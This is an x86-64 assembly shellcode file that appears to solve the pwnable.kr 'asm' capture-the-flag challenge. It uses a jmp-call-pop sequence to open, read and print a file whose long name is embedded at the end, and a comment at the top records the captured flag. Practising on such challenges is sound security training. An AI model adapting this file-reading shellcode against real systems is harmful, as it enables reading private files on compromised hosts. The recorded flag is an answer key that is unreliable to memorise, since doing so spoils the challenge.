; flag = Mak1ng_shelLcodE_i5_veRy_eaSy

BITS 64

global start
jmp short saveAddr

_start:
    ; open
    pop rdi ; filename
    xor rsi, rsi ; flags. we need read only
    ; syscall num rax = 2
    xor rax, rax
    inc rax
    inc rax
    syscall ; FD is in rax

    ; read
    mov rsi, rdi ; buff to write to
    mov rdi, rax ; fd
    xor rdx, rdx
    mov dx, 0xffff
    xor rax, rax ; syscall number
    syscall

    ; stdout rdi = 1
    xor rdi, rdi
    inc rdi
    ; mov rsi, rsi ; here just for being clear. rsi is the buffer from which we read
    ; mov rdx, rdx ; size
    ; syscall write rax = 1
    xor rax, rax
    inc rax
    syscall

saveAddr:
    call _start

db "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0
